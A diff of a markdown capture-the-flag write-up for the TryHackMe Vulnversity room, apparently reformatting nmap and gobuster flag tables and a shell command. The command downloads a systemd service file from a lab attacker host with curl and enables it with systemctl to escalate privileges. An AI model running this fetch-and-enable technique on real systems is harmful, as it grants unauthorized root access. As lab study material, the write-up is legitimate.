@@ -4,8 +4,10 @@
 
 ## NMAP
 
--sV => Determine versions of running services
--sC => Scan with default namp scripts
+| Flag | Description|
+|----|---|
+| -sV | Determine versions of running services
+| -sC | Scan with default namp scripts
 
 ```
 koffee@kali:~/tryhackme/vulnversity$ nmap -sV -sC -oN scan.nmap 10.10.65.121 
@@ -60,7 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 42.14 seconds
 
 | Flag | Description|
 |----|---|
-|-e |	Print the full URLs in your console |
+-e |	Print the full URLs in your console |
 -u / --url	| The target URL
 -w	| Path to your wordlist
 -U and -P	| Username and Password for Basic Auth
@@ -193,9 +195,13 @@ WantedBy=multi-user.target
 ```
 
 ```
-$ TF=$(mktemp).service && curl 10.x.x.x:9999/service.txt > $TF && systemctl link $TF && systemctl enable --now $TF && cat /tmp/out
+$ TF=$(mktemp).service \
+  && curl 10.x.x.x:9999/service.txt > $TF \
+  && systemctl link $TF \
+  && systemctl enable --now $TF \
+  && cat /tmp/out
 
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   114  100   114    0     0    337      0 --:--:-- --:--:-- --:--:--   337
 Created symlink from /etc/systemd/system/tmp.L3uCyJblwK.service to /tmp/tmp.L3uCyJblwK.service.
